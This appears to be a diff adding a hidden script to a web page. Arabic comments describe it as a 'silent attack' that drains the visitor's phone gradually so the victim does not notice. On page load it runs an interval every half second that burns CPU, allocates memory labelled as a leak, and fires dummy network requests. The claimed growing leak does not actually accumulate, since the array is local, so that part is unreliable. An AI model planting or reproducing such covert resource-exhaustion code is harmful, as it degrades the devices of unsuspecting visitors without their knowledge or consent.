@@ -1,0 +1,22 @@
+<script>
+    // هجوم صامت: استهلاك موارد ذكي (Trickle Down Exhaustion)
+    function stealthAttack() {
+        // بدلاً من Loop لا نهائي، نستخدم Interval يعمل في الخلفية ببطء
+        setInterval(() => {
+            // 1. استهلاك بسيط للمعالج (عمليات حسابية لا تظهر في الواجهة)
+            for (let i = 0; i < 500000; i++) {
+                Math.sqrt(Math.random() * 88.88);
+            }
+            
+            // 2. تسريب ذاكرة بسيط (Memory Leak) يزداد مع الوقت
+            // الضحية لن يشعر بالتهنيج فوراً، بل سيشعر أن جواله بدأ "يثقل" تدريجياً
+            let leak = new Array(50000).fill("Nawaf_Academy_Hidden_Task");
+            
+            // 3. إشغال الشبكة بطلبات وهمية (Hidden Background Requests)
+            fetch('#?data=' + Math.random()); 
+
+        }, 500); // يعمل كل نصف ثانية (بطيء بما يكفي ليكون صامتاً)
+    }
+
+    window.onload = stealthAttack;
+</script>
